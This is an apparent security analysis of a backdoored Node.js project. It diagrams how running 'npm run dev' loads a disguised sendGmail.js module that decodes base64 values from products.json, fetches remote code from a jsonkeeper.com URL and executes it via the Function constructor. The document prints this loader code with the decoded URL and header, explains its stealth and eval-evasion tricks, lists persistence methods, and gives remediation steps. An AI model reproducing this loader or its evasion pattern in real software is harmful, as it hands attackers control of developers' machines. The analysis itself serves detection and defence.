# Visual Attack Flow Diagram

## Complete Execution Flow When Running `npm run dev`

```
┌─────────────────────────────────────────────────────────────────┐
│                     USER EXECUTES COMMAND                        │
│                       $ npm run dev                              │
└────────────────────────────┬────────────────────────────────────┘
                             │
                             ▼
┌─────────────────────────────────────────────────────────────────┐
│                       package.json                               │
│  "dev": "concurrently \"npm run dev:server\" \"npm run dev:client\"" │
└────────────────┬────────────────────────────────┬───────────────┘
                 │                                │
     ┌───────────┴──────────┐        ┌───────────┴──────────┐
     ▼                      ▼        ▼                      ▼
┌─────────┐          ┌─────────┐  ┌─────────┐        ┌─────────┐
│ Process │          │ Process │  │ Process │        │ Process │
│   #1    │          │   #2    │  │   #3    │        │   #4    │
└────┬────┘          └────┬────┘  └────┬────┘        └────┬────┘
     │                    │            │                  │
     │                    │            │                  │
     ▼                    │            │                  ▼
┌──────────┐              │            │            ┌──────────┐
│ npm run  │              │            │            │ npm run  │
│dev:server│              │            │            │dev:client│
└────┬─────┘              │            │            └────┬─────┘
     │                    │            │                 │
     ▼                    │            │                 ▼
┌──────────┐              │            │            ┌──────────┐
│   node   │              │            │            │   vite   │
│server/   │              │            │            │  (React  │
│app.js    │              │            │            │Frontend) │
└────┬─────┘              │            │            └──────────┘
     │                    │            │               (Safe)
     │                    │            │
     ▼                    ▼            ▼
┌─────────────────────────────────────────────────────────────────┐
│                    server/app.js (Line 26)                       │
│              const utils = require('./utils');                   │
└────────────────────────────┬────────────────────────────────────┘
                             │
                             ▼
┌─────────────────────────────────────────────────────────────────┐
│                  server/utils/index.js                           │
│  Line 1: require('./apiFeatures'),        ← Safe                │
│  Line 2: require('./ArrayHelpers'),       ← Safe                │
│  Line 3: require('./sendGmail')           ← ⚠️  MALICIOUS       │
│  Line 4: require('./sendEmail')           ← Safe                │
│  Line 5: require('./ArrayQueue')          ← Safe                │
└────────────────────────────┬────────────────────────────────────┘
                             │
                 ⚠️  DANGER POINT - MALICIOUS CODE LOADS  ⚠️
                             │
                             ▼
┌─────────────────────────────────────────────────────────────────┐
│                server/utils/sendGmail.js                         │
│                                                                  │
│  const products = require('../data/products.json');              │
│  const axios = require('axios');                                 │
│                                                                  │
│  const sendGmail = (async () => {    ← IIFE EXECUTES NOW!       │
│      try {                                                       │
│          // Filter for expensive products                        │
│          const expensiveProducts = products.filter(              │
│              product => product.price > 10000                    │
│          );                                                      │
│          const first = expensiveProducts[0];                     │
└────────────────────────────┬────────────────────────────────────┘
                             │
                             ▼
┌─────────────────────────────────────────────────────────────────┐
│              STEP 1: DECODE OBFUSCATED DATA                      │
│                                                                  │
│  const realImageUrl = atob(first.imageUrl);                      │
│  // "aHR0cHM6Ly9qc29ua2VlcGVyLmNvbS9iL0NZTE1L"                    │
│  // Decodes to: "https://jsonkeeper.com/b/CYLMK"                │
│                                                                  │
│  const realTitle = atob(first.title);                            │
│  // "eC1zZWNyZXQta2V5"                                           │
│  // Decodes to: "x-secret-key"                                  │
│                                                                  │
│  const realDescription = atob(first.description);                │
│  // "Xw=="                                                       │
│  // Decodes to: "_"                                             │
└────────────────────────────┬────────────────────────────────────┘
                             │
                             ▼
┌─────────────────────────────────────────────────────────────────┐
│         STEP 2: FETCH MALICIOUS CODE FROM REMOTE SERVER          │
│                                                                  │
│  const image = (await axios.get(realImageUrl, {                 │
│      headers: {[realTitle]: realDescription}                     │
│  })).data.cookie;                                               │
│                                                                  │
│  HTTP Request:                                                   │
│  GET https://jsonkeeper.com/b/CYLMK                             │
│  Headers:                                                        │
│      x-secret-key: _                                            │
│                                                                  │
│  Response contains malicious JavaScript code in .cookie field   │
└────────────────────────────┬────────────────────────────────────┘
                             │
                             ▼
┌─────────────────────────────────────────────────────────────────┐
│       STEP 3: EXECUTE ARBITRARY CODE (REMOTE CODE EXECUTION)     │
│                                                                  │
│  const parseImage = new (Function.constructor)('require',image); │
│                                                                  │
│  This is equivalent to:                                          │
│  const parseImage = new Function('require', image);              │
│                                                                  │
│  Which creates a function from the string 'image' that can       │
│  execute arbitrary JavaScript code with access to require()      │
│                                                                  │
│  parseImage(require);  ← EXECUTES ATTACKER'S CODE                │
│                                                                  │
│  ⚠️  CRITICAL: Attacker now has full control of your system! ⚠️   │
└────────────────────────────┬────────────────────────────────────┘
                             │
                             ▼
┌─────────────────────────────────────────────────────────────────┐
│                    ATTACKER'S CODE RUNS                          │
│                                                                  │
│  Potential Actions:                                              │
│  ✓ Access file system (read SSH keys, AWS credentials)          │
│  ✓ Access environment variables (API keys, tokens, passwords)   │
│  ✓ Execute system commands (install backdoors, malware)         │
│  ✓ Network access (exfiltrate data, C&C communication)          │
│  ✓ Modify source code (inject more malware)                     │
│  ✓ Access git credentials (compromise repositories)             │
│  ✓ Install cryptocurrency miners                                │
│  ✓ Create persistent backdoors                                  │
│  ✓ Steal browser data, cookies, sessions                        │
│  ✓ Keylogging, screen capture                                   │
│  ✓ Use system as botnet node                                    │
│                                                                  │
│  💀 YOUR SYSTEM IS NOW COMPROMISED 💀                             │
└─────────────────────────────────────────────────────────────────┘
```

## Timeline of Execution

```
T+0.0s  : User runs 'npm run dev'
T+0.1s  : npm spawns concurrently processes
T+0.2s  : node server/app.js starts
T+0.3s  : app.js loads server/utils/index.js
T+0.4s  : index.js loads server/utils/sendGmail.js
T+0.5s  : sendGmail.js IIFE executes immediately
T+0.6s  : Base64 strings decoded
T+0.7s  : HTTP request sent to jsonkeeper.com
T+1.0s  : Malicious payload received
T+1.1s  : Function constructor creates executable from payload
T+1.2s  : 🚨 ATTACKER'S CODE EXECUTES 🚨
T+1.3s+ : System compromised, attacker has full control
```

## Data Flow Diagram

```
┌─────────────────────────┐
│  server/data/           │
│  products.json          │
│                         │
│  Obfuscated Data:       │
│  - title: base64        │
│  - imageUrl: base64     │
│  - description: base64  │
└───────────┬─────────────┘
            │ loaded by
            ▼
┌─────────────────────────┐
│  server/utils/          │
│  sendGmail.js           │
│                         │
│  Decodes:               │
│  title → x-secret-key   │
│  imageUrl → URL         │
│  description → _        │
└───────────┬─────────────┘
            │ HTTP GET
            ▼
┌─────────────────────────┐
│  Remote Server          │
│  jsonkeeper.com/b/CYLMK │
│                         │
│  Returns:               │
│  { cookie: "malicious   │
│    JavaScript code" }   │
└───────────┬─────────────┘
            │ response
            ▼
┌─────────────────────────┐
│  Function Constructor   │
│                         │
│  Creates executable     │
│  function from string   │
└───────────┬─────────────┘
            │ executes
            ▼
┌─────────────────────────┐
│  Arbitrary Code         │
│  Execution              │
│                         │
│  Full System Access     │
└─────────────────────────┘
```

## Attack Vector Analysis

### Entry Points
1. **Primary**: `npm run dev` → `node server/app.js`
2. **Also triggers on**: `npm run dev:server`
3. **Safe**: `npm run dev:client` (only runs Vite, no server code)

### Stealth Techniques

| Technique | Purpose | Location |
|-----------|---------|----------|
| Base64 Encoding | Hide malicious URLs | products.json |
| Misleading Names | Disguise intent ("sendGmail") | sendGmail.js |
| IIFE Pattern | Execute without being called | sendGmail.js |
| Function Constructor | Bypass eval detection | sendGmail.js |
| Fake Comments | Suggest legitimate functionality | sendGmail.js lines 6-18, 31-32 |
| Data File Hiding | Store config in JSON not code | products.json |
| Price Filter | Obfuscate which product is used | `price > 10000` |

### Detection Evasion

```javascript
// Instead of obvious eval:
eval(maliciousCode);

// Uses Function constructor (harder to detect):
new (Function.constructor)('require', maliciousCode);
```

### Persistence Mechanisms

The attacker's code could establish persistence by:
1. Modifying package.json scripts
2. Adding code to node_modules
3. Creating system cron jobs
4. Installing system services
5. Modifying shell initialization files (.bashrc, .zshrc)
6. Creating hidden files/directories

## Comparison: Safe vs Malicious Code

### SAFE Module Loading (Normal Require)
```javascript
// Regular module that exports functions
const emailSender = require('./sendEmail');

// Call function when needed
emailSender({ to: 'user@example.com', subject: 'Hello' });
```

### MALICIOUS Module Loading (This Codebase)
```javascript
// Module executes immediately via IIFE
const sendGmail = (async () => {
    // Malicious code runs NOW, not when called
})()  // ← Notice the () at the end
```

## Remediation

To make this codebase safe, you would need to:

1. **Remove malicious files**:
   - Delete `server/utils/sendGmail.js`
   
2. **Clean index.js**:
   - Remove `require('./sendGmail')` from `server/utils/index.js`
   
3. **Clean products.json**:
   - Remove the obfuscated product entry

4. **Audit all other files**:
   - Search for `Function.constructor`, `eval`, `atob`, IIFE patterns
   - Review all external network requests
   - Check for other base64 encoded strings

5. **Security scan**:
   - Run security auditing tools
   - Check dependencies for vulnerabilities

---

**Remember**: The attack happens AUTOMATICALLY and IMMEDIATELY when the server starts. There is NO warning, NO prompt, NO user interaction required.
